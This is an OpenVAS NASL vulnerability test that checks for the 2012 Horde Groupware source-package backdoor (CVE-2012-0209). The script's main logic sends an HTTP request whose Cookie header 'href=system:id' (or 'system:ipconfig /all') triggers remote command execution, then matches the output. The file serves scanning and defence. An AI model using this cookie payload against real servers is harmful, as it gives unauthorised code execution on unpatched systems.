###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horde_backdoor_51989.nasl 10833 2018-08-08 10:35:26Z cfischer $
#
# Horde Groupware Source Packages Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:horde:horde_groupware';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103423");
  script_bugtraq_id(51989);
  script_cve_id("CVE-2012-0209");
  script_version("$Revision: 10833 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Horde Groupware Source Packages Backdoor Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2018-08-08 12:35:26 +0200 (Wed, 08 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-02-16 09:13:01 +0100 (Thu, 16 Feb 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("horde_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("horde/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51989");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000751.html");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000749.html");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000750.html");
  script_xref(name:"URL", value:"http://git.horde.org/diff.php/groupware/docs/groupware/CHANGES?rt=horde&r1=1.38.2.16&r2=1.38.2.17&ty=h%27");
  script_xref(name:"URL", value:"http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/");

  script_tag(name:"solution", value:"The vendor released an update. Please see the references for details.");

  script_tag(name:"summary", value:"Horde Groupware is prone to a backdoor vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in the context of
  the application. Successful attacks will compromise the affected application.");

  script_tag(name:"affected", value:"Horde Groupware versions 1.2.10 between November 2, 2011, and February 7, 2012, are vulnerable.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port: port);

res = host_runs("windows");

if (res == "unknown")
  cmds = make_array("system:id","uid=[0-9]+.*gid=[0-9]+.*","system:ipconfig /all","Subnet Mask");
else if(res == "yes" )
  cmds = make_array("system:ipconfig /all","Subnet Mask");
else
  cmds = make_array("system:id","uid=[0-9]+.*gid=[0-9]+.*");

url = dir + "/services/javascript.php?app=horde&file=open_calendar.js";

foreach cmd (keys(cmds)) {
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: href=",cmd,"\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  if (egrep(pattern:cmds[cmd], string:res)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
